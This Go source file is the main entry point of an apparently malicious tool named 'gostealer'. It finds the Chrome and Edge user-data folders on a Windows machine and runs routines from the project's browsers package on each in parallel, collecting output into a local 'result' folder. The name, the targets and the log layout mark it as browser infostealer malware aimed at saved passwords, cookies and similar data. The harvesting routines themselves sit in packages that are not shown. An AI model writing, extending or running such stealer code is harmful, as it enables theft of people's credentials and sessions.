package main

import (
	"os"
	"path"
	"sync"

	"github.com/4kord/gostealer/browsers"
	"github.com/4kord/gostealer/utils"
)

func main() {
	logFolderPath := "./result"
	wg := sync.WaitGroup{}

	utils.CreateStructure(logFolderPath)

	edgePath := path.Join(os.Getenv("localappdata"), `Microsoft\Edge\User Data`)
	chromePath := path.Join(os.Getenv("localappdata"), `Google\Chrome\User Data`)

	wg.Add(1)
	go func() {
		browsers.Chrome(chromePath, logFolderPath)
		wg.Done()
	}()
	wg.Add(1)
	go func() {
		browsers.Edge(edgePath, logFolderPath)
		wg.Done()
	}()
	wg.Wait()
}
